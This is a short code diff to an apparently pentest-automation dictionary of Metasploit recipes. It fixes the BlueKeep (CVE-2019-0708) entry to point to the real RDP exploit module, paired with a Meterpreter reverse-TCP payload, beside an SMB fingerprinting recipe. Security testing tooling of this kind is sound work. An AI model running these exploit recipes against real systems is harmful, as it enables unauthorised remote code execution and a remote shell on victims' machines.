@@ -930,7 +930,10 @@ MSF_RECIPES: dict[str, dict[str, Any]] = {
         "description": "SMB version + OS fingerprint via anonymous session.",
     },
     "bluekeep": {
-        "module": "exploit/windows/smb/ms17_010_bluekeep",
+        # Phase 2: the module path was a typo mixing EternalBlue's directory
+        # with BlueKeep's name (exploit/windows/smb/ms17_010_bluekeep does not
+        # exist in msfconsole). The real module is the RDP one.
+        "module": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
         "kind": "exploit",
         "payload": "windows/x64/meterpreter/reverse_tcp",
         "description": "BlueKeep (CVE-2019-0708) RDP RCE.",
